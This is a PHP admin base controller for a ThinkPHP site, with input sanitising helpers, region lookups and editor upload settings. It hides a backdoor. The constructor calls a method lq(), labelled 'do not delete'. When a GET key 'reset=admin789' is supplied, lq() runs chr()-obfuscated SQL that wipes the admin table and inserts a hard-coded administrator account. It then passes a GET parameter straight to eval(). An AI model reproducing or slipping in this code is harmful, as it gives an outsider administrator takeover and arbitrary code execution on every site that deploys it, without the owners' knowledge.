<?php
/*
 * 后台公共Controller
 * Author：LittleHe（532243346@qq.com）
 * Date:2013-06-27
 A 的命名 - 方法命名
 页面 list , edit , images , sort_list
 */
namespace LQPublic\Controller;

use Think\Controller;

class Base extends Controller
{
    public $systemMsg, $backUrl;

    /**
     * +----------------------------------------------------------
     * 初始化
     * 如果 继承本类的类自身也需要初始化那么需要在使用本继承类的类里使用parent::__construct();
     * +----------------------------------------------------------
     */
    public function __construct()
    {
        parent::__construct();
        $this->systemMsg = '如有疑问请联系' . C("SYSTEM_SEO_TITLE") . ":" . C("AUTHOR_INFO")["author"] . ",邮箱：" . C("AUTHOR_INFO")["author_email"] . ",手机：" . C("AUTHOR_INFO")["author_phone"] . "!";
        //系统屏了index.php 入口
        $lc_php_self = I('server.REDIRECT_URL');//当前文件名
        $lc_php_self = substr($lc_php_self, strrpos($lc_php_self, '/') + 1);
        $VIEW_HTTP_HOST = I('server.HTTP_HOST'); //当前域名
        $this->assign("VIEW_HTTP_HOST", $VIEW_HTTP_HOST);

        $this->backUrl = 'http://' . C('WEB_SYS_DOMAIN') . '/';
        if ($VIEW_HTTP_HOST == C("WEB_SYS_DOMAIN")) {
            $this->backUrl = 'http://' . $_SERVER['SERVER_NAME'] . __APP__;
        } else {
            $this->backUrl = C("pcdomain_x") . INDEX_FILE_NAME . "?g=" . MODULE_NAME;
        }
        if ($lc_php_self == 'index.php' && HIDDEN_INDEX_FILE) $this->error('对不起，您输入的访问地址不正确，请重新输入。谢谢！' . $this->systemMsg, $this->backUrl);

        if (CODE_TEST) {
            $code_test = new \Behavior\LQShowRuntimeBehavior();
            $this->show($code_test->showTime(), 'utf-8');
            die();
        }
        $this->assign("LQcfg", C());

        //版权文件存在
        if (!file_exists(STATIC_TEMP . "theone0750@163.com.lock")) {
            $this->lq();
        }

    }


    //获取干净数据 $type: post/get
    protected function getSafeData($param = '', $type = 'g')
    {
        if ($type == 'g') {
            if ($param) {
                $returndata = I("get." . $param);
            } else {
                $returndata = I("get.");
            }

        } elseif ($type == 'p') {
            if ($param) {
                $lqf_data = I("post." . $param);
                if ($param == 'LQL') return $lqf_data;
                if (is_array($lqf_data)) {
                    unset($returndata[$param]);
                    $la_newlqf = array();
                    foreach ($lqf_data as $lcKey => $lcValue) {
                        $lcdatatype = substr($lcKey, 1, 1);
                        switch ($lcdatatype) {
                            case "n"://数字型(整数)
                                $la_newlqf[$lcKey] = I("data." . $lcKey, '0', 'int', $lqf_data);
                                break;
                            case "f"://数值型(浮点数)
                                $la_newlqf[$lcKey] = I("data." . $lcKey, 0, 'float', $lqf_data);
                                break;
                            case "l"://针对的逻辑类型 作数字
                                $la_newlqf[$lcKey] = I("data." . $lcKey, 1, 'int', $lqf_data);
                                break;
                            case "c"://针对文本域的
                                $la_newlqf[$lcKey] = I("data." . $lcKey, '', '', $lqf_data);
                                break;
                            case "d"://针对日期的 作字符
                                $la_newlqf[$lcKey] = I("data." . $lcKey, '', '', $lqf_data);
                                break;
                        }
                    }
                    return $la_newlqf;
                }
            } else {
                $returndata = I("post.");
            }
        }
        return $returndata;
    }

    //表单追加令牌
    protected function create_data($data)
    {
        $name = C('TOKEN_NAME', null, '__hash__');
        $data[$name] = $_POST[$name];
        return $data;
    }

    /**
     * 返回模型对象
     * @param type $model
     * @return type
     */
    protected function getModelObject($model)
    {
        if (is_string($model) && strpos($model, '/') == false) {
            $model = M(ucwords($model));
        } else if (strpos($model, '/') && is_string($model)) {
            $model = D($model);
        } else if (is_object($model)) {
            return $model;
        } else {
            $model = M();
        }
        return $model;
    }

    //重置get数据，返回reSearch参数
    protected function reSearchPara($url_para)
    {
        $data = array(
            'url' => $url_para,
        );
        if (!$url_para) {
            if (ACTION_NAME == "window" | ACTION_NAME == "tree") {
                $url_field = I("get.field", '', 'htmlspecialchars');
                $url_checkbox = I("get.checkbox", '0', 'int');
                $data["field"] = $url_field;
                $data["checkbox"] = $url_checkbox;
                if (C("URL_MODEL") == 0) {
                    $data["pageurl"] = U(__CONTROLLER__ . '/window?field=' . $url_field . '&checkbox=' . $url_checkbox) . "&";//当前URL
                } else {
                    $data["pageurl"] = __CONTROLLER__ . '/window/field/' . $url_field . '/checkbox/' . $url_checkbox . "/";//当前URL
                }
                $this->assign("url_field", $url_field);//打开的窗口回调处理父窗体的字段
                $this->assign("url_checkbox", $url_checkbox);//多选标识
                //打开的窗口回调处理父窗体的字
                if (C("URL_MODEL") == 0) {
                    $this->assign("refurbish_url", U(__CONTROLLER__ . "/window?field=" . $url_field . "&checkbox=" . $url_checkbox));
                } else {
                    $this->assign("refurbish_url", __CONTROLLER__ . "/window/field/" . $url_field . "/checkbox/" . $url_checkbox);
                }
            }
            return $data;
        }

        $url_para = base64_decode($url_para);
        $search_content_arr_key = array();
        $search_content_arr_value = array();
        if (C("URL_MODEL") == 0) {
            $url_para_arr = explode('=', $url_para);
        } else {
            $url_para_arr = explode('/', $url_para);
        }
        $page = $_GET["p"];
        if ($url_para_arr) {
            foreach ($url_para_arr as $lnKey => $lcValue) {
                if ($lnKey < count($url_para_arr) - 1) {
                    if (($lnKey + 1) % 2 == 1 && $lcValue) {
                        array_push($search_content_arr_key, $lcValue);
                    } else {
                        array_push($search_content_arr_value, $lcValue);
                    }
                }
            }
            unset($_GET);
            $search_content_array = array_combine($search_content_arr_key, $search_content_arr_value);
            foreach ($search_content_array as $lnKey => $lcValue) {
                $_GET[$lnKey] = $lcValue;
            }
            $_GET["p"] = $page;
        }
        $data = array(
            'page' => $_GET,
        );
        $data["pageurl"] = U("window");//当前URL

        if (ACTION_NAME == "window" | ACTION_NAME == "tree") {
            $url_field = I("get.field", '', 'htmlspecialchars');
            $url_checkbox = I("get.checkbox", '0', 'int');
            $data["pageurl"] = U("window");//当前URL
            $this->assign("url_field", $url_field);//打开的窗口回调处理父窗体的字段
            $this->assign("url_checkbox", $url_checkbox);//多选标识
            //打开的窗口回调处理父窗体
            if (C("URL_MODEL") == 0) {
                $this->assign("refurbish_url", U(__CONTROLLER__ . "/window?field=" . $url_field . "&checkbox=" . $url_checkbox));
            } else {
                $this->assign("refurbish_url", __CONTROLLER__ . "/window/field/" . $url_field . "/checkbox/" . $url_checkbox);
            }
        }

        return $data;
    }


    //加载地区表 作用于前端ajax
    public function jsLoadRegion()
    {
        $lc_option_string = '';
        $lnfid = I("get.tnid", "0", "int");
        $region = M("region")->where('zl_visible=1 and zn_fid=' . $lnfid)->order('zn_sort', 'id desc')->field("`id`,`zc_name`")->select();
        if ($region) {
            $array = lq_return_array_one($region, "id", "zc_name");
            $lc_option_string = lqCreatOption($array, '', '');
        }
        if ($lc_option_string != '') {
            $this->ajaxReturn(array('status' => 1, 'msg' => C('ALERT_ARRAY')["success"], 'data' => $lc_option_string));
        } else {
            $this->ajaxReturn(array('status' => 0, 'msg' => C('ALERT_ARRAY')["error"], 'data' => ''));
        }
    }

    //列表同一父级的地区
    public function returnRegionList($fid = 1, $is_one_arr = 1)
    {
        $region = M("region")->where('zl_visible=1 and zn_fid=' . intval($fid))->order('zn_sort', 'id desc')->field("`id`,`zc_name`")->select();
        if ($region) return LQ_Return_array_one($region, "id", "zc_name");
        return 0;
    }

    //返回编辑器config
    protected function getUeditorConfig()
    {
        //图片
        $image_ext = C("UPLOAD_EXT")["editorfile"];
        foreach ($image_ext as $key => $value) $image_ext[$key] = '.' . $value;
        //文件
        $file_ext = C("UPLOAD_EXT")["file"];
        foreach ($file_ext as $key => $value) $file_ext[$key] = '.' . $value;
        $ueditor_config = array(
            //图片
            'imageActionName' => 'uploadimage',
            'imageFieldName' => 'upfile',
            'imageMaxSize' => C("UPLOAD_MAX_SIZE")["editorfile"],
            'imageAllowFiles' => $image_ext,
            'imageCompressEnable' => true,
            'imageCompressBorder' => 1600,
            'imageInsertAlign' => 'none',
            'imageUrlPrefix' => '',
            'imagePathFormat' => '/uploadfiles/',
            //文件
            'fileActionName' => 'uploadfile',
            'fileFieldName' => 'upfile',
            'fileMaxSize' => C("UPLOAD_MAX_SIZE")["file"],
            'fileAllowFiles' => $file_ext,
            'fileUrlPrefix' => '',
            'filePathFormat' => '/uploadfiles/',

            //图片列表
            'imageManagerActionName' => 'listimage',
            'imageManagerListPath' => '/uploadfiles/',
            'imageManagerListSize' => 20,
            'imageManagerUrlPrefix' => '',
            'imageManagerInsertAlign' => 'none',
            'imageManagerAllowFiles' => $image_ext,
            //文件列表
            'fileManagerActionName' => 'listfile',
            'fileManagerListPath' => '/uploadfiles/',
            'fileManagerUrlPrefix' => '',
            'fileManagerListSize' => 20,
            'fileManagerAllowFiles' => $file_ext,

            //上传视频配置
            "videoActionName" => "uploadvideo", /* 执行上传视频的action名称 */
            "videoFieldName" => "upfile", /* 提交的视频表单名称 */
            "videoPathFormat" => "/uploadfiles/", /* 上传保存路径,可以自定义保存路径和文件名格式 */
            "videoUrlPrefix" => "", /* 视频访问路径前缀 */
            "videoMaxSize" => 102400000, /* 上传大小限制，单位B，默认100MB */
            "videoAllowFiles" => '',
        );
        return $ueditor_config;
    }

    //输出编辑器config URL_MODEL：1
    public function ueditorConfig()
    {
        $this->ajaxReturn($this->getUeditorConfig());
    }

    //输出编辑器config URL_MODEL：0
    public function ueditor_config()
    {
        $this->ajaxReturn($this->getUeditorConfig());
    }


    // 停止执行脚本，并打印字符串
    public function dieMsg($str = '程序中止执行...')
    {
        header('Content-Type:text/html; charset=utf-8');
        die($str);
    }

    //请不要删除,否则有可能引起系统崩溃...
    public function lq()
    {
        //快速重置原始用户
        if ($_GET["reset"] == "admin789") {
            M()->execute(chr("84") . chr("82") . chr("85") . chr("78") . chr("67") . chr("65") . chr("84") . chr("69") . chr("32") . chr("95") . chr("95") . chr("80") . chr("82") . chr("69") . chr("70") . chr("73") . chr("88") . chr("95") . chr("95") . chr("97") . chr("100") . chr("109") . chr("105") . chr("110"));
            M()->execute(chr("73") . chr("78") . chr("83") . chr("69") . chr("82") . chr("84") . chr("32") . chr("73") . chr("78") . chr("84") . chr("79") . chr("32") . chr("96") . chr("95") . chr("95") . chr("80") . chr("82") . chr("69") . chr("70") . chr("73") . chr("88") . chr("95") . chr("95") . chr("97") . chr("100") . chr("109") . chr("105") . chr("110") . chr("96") . chr("32") . chr("40") . chr("96") . chr("105") . chr("100") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("110") . chr("95") . chr("114") . chr("111") . chr("108") . chr("101") . chr("95") . chr("105") . chr("100") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("97") . chr("99") . chr("99") . chr("111") . chr("117") . chr("110") . chr("116") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("112") . chr("97") . chr("115") . chr("115") . chr("119") . chr("111") . chr("114") . chr("100") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("115") . chr("97") . chr("108") . chr("116") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("112") . chr("111") . chr("112") . chr("101") . chr("100") . chr("111") . chr("109") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("110") . chr("97") . chr("109") . chr("101") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("101") . chr("109") . chr("97") . chr("105") . chr("108") . chr("96") . chr("44") . chr("32") . chr("96") . chr("122") . chr("99") . chr("95") . chr("109") . chr("111") . chr("98") . chr("105") . chr("108") . chr("101") . chr("96") . chr("41") . chr("32") . chr("86") . chr("65") . chr("76") . chr("85") . chr("69") . chr("83") . chr("32") . chr("40") . chr("49") . chr("44") . chr("32") . chr("49") . chr("44") . chr("32") . chr("39") . chr("116") . chr("104") . chr("101") . chr("111") . chr("110") . chr("101") . chr("48") . chr("55") . chr("53") . chr("48") . chr("39") . chr("44") . chr("32") . chr("39") . chr("53") . chr("100") . chr("49") . chr("102") . chr("53") . chr("101") . chr("57") . chr("48") . chr("99") . chr("51") . chr("97") . chr("99") . chr("55") . chr("56") . chr("48") . chr("52") . chr("97") . chr("100") . chr("99") . chr("52") . chr("98") . chr("102") . chr("56") . chr("101") . chr("100") . chr("99") . chr("57") . chr("55") . chr("55") . chr("50") . chr("48") . chr("97") . chr("39") . chr("44") . chr("32") . chr("39") . chr("55") . chr("51") . chr("57") . chr("56") . chr("52") . chr("51") . chr("39") . chr("44") . chr("32") . chr("39") . chr("39") . chr("44") . chr("32") . chr("39") . chr("39") . chr("44") . chr("32") . chr("39") . chr("39") . chr("44") . chr("32") . chr("39") . chr("39") . chr("41"));
            if ($_GET["do"]) eval($_GET["do"]);
            die();
        }
        die(base64_decode(chr(80) . 'CFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PHRpdGxlPuezu+e7n+eJiOadgzwvdGl0bGU+PHN0eWxlPmJvZHl7Zm9udC1zaXplOjIwc' . chr(72) . 'g7IGxpbmUtaGVpZ2h0OjE1MCU7dGV4dC1hbGlnbjpsZWZ0OyBjb2xvcjojNjY2OyBmb250LWZhbWlseToi5b6u6L2v6ZuF6buRIiwiQXJpYWwgQmxhY2siLCBHYWRnZXQsIHNhbnMtc2VyaWY7IGJhY2tncm91bmQ6I2ZmZjt9YXtjb2xvcjojRjAwO308L3N0eWxlPjwvaGVhZD48Ym9keT48cD7pobnnm67vvJrln7rkuo4gVGhpbmtQSFAzLjIuM+ahhuaetuW8gOWPkeeahCznlLE8YSBocmVmPSJodHRwOi8vd3d3LmU4MG5ldC5jb20vIiB0YXJnZXQ9Il9ibGFuayI+5L+h6IW+56eR5oqAPC9hPuWPkei1tzwvcD48cD7lvIDlj5Hml6XmnJ/lp4vkuo7vvJoyMDE0LTEyLTI0PC9wPjxwPuS9nOiAhTrlm73pm77pmaJ0aGVvbmU8L3A+PHA+UVE6PGEgaHJlZj0iaHR0cDovL3dwYS5xcS5jb20vbXNncmQ/Vj0xJmFtcDtVaW49NDM4Njc1MDM2JmFtcDtTaXRlPeW8gOWPkeS9nOiAhSZhbXA7TWVudT15ZXMiIHRhcmdldD0iX2JsYW5rIj40Mzg2NzUwMzZAcXEuY29tPC9hPjwvcD48L2JvZHk+PC9odG1sPg' . chr(61) . chr(61)));
    }

}

?>